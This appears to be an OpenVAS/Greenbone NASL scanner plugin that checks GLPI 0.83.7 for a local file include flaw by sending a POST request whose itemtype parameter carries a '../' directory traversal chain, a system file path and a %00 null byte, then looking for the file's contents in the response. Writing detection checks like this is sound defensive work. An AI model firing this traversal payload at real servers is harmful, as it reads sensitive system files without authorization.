CPE = "cpe:/a:glpi-project:glpi";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103743" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_name( "GLPI Local File Include Vulnerability" );
	script_xref( name: "URL", value: "http://www.zeroscience.mk/en/vulnerabilities/ZSL-2013-5145.php" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2013-06-20 11:59:55 +0200 (Thu, 20 Jun 2013)" );
	script_category( ACT_ATTACK );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2013 Greenbone Networks GmbH" );
	script_dependencies( "gb_glpi_detect.sc", "os_detection.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "glpi/detected" );
	script_tag( name: "solution", value: "Vendor updates are available." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "summary", value: "GLPI is prone to a local file include vulnerability because it fails
  to adequately validate user-supplied input." );
	script_tag( name: "impact", value: "An attacker can exploit this vulnerability to obtain potentially
  sensitive information and execute arbitrary local scripts. This could
  allow the attacker to compromise the application and the computer.
  Other attacks are also possible." );
	script_tag( name: "affected", value: "GLPI 0.83.7 is vulnerable. Other versions may also be vulnerable." );
	exit( 0 );
}
require("misc_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
url = dir + "/ajax/common.tabs.php";
useragent = http_get_user_agent();
host = http_host_name( port: port );
files = traversal_files();
for file in keys( files ) {
	ex = "target=/glpi/front/user.form.php&itemtype=" + crap( data: "../", length: 9 * 6 ) + files[file] + "%00User&glpi_tab=Profile_User$1&id=2";
	len = strlen( ex );
	req = NASLString( "POST ", url, " HTTP/1.1\\r\\n", "Host: ", host, "\\r\\n", "Content-Length: ", len, "\\r\\n", "User-Agent: ", useragent, "\\r\\n", "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\\r\\n", "Accept-Language: en-US,en;q=0.5\\r\\n", "Accept-Encoding: Identity\\r\\n", "X-Requested-With: XMLHttpRequest\\r\\n", "Content-Type: application/x-www-form-urlencoded; charset=UTF-8\\r\\n", "Referer: http://", host, "/glpi/front/user.form.php?id=2\\r\\n", "\\r\\n", ex );
	result = http_keepalive_send_recv( port: port, data: req, bodyonly: FALSE );
	if(eregmatch( pattern: file, string: result )){
		security_message( port: port );
		exit( 0 );
	}
}
exit( 99 );

